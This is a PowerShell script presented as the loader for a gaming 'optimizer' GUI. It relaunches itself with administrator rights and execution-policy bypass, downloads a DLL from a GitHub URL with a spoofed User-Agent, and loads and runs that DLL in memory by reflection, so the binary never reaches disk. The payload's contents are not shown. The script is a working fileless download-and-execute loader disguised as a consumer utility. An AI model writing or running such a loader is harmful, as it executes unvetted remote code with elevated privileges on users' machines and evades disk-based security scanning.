<#
.SYNOPSIS
    FRUSTRATED GAMER OPTIMIZER (FGOptimizer) - In-Memory Assembly Loader
.DESCRIPTION
    Loads the compiled FG_Optimizer.dll directly into PowerShell memory from GitHub
    and launches your exact C# GUI application using Reflection.
#>

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$v = Get-Random
$dllUrl = "https://raw.githubusercontent.com/klrkofficialshop/dogingontop/main/FG_Optimizer.dll?v=$v"

Write-Host "==========================================================" -ForegroundColor DarkYellow
Write-Host "   FRUSTRATED GAMER OPTIMIZER - LOADING FULL C# ENGINE    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkYellow
Write-Host "[*] Downloading FG_Optimizer.dll into memory..." -ForegroundColor Yellow

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $webClient.Headers.Add("Cache-Control", "no-cache")
    $dllBytes = $webClient.DownloadData($dllUrl)

    Write-Host "[+] Loaded $([Math]::Round($dllBytes.Length / 1KB, 2)) KB into memory. Starting GUI..." -ForegroundColor Green

    # Load assembly dynamically in PowerShell process memory
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)

    # Locate EntryPoint dynamically
    $programType = $assembly.GetType("FG_Optimizer.Program")
    if ($null -eq $programType) {
        $programType = ($assembly.GetTypes() | Where-Object { $_.Name -eq "Program" })[0]
    }

    $mainMethod = $programType.GetMethod("Main", [System.Reflection.BindingFlags]"Static, Public, NonPublic")

    [System.Windows.Forms.Application]::EnableVisualStyles()
    $mainMethod.Invoke($null, $null)

} catch {
    Write-Host "[-] Error launching FG Optimizer GUI: $_" -ForegroundColor Red
    Pause
}
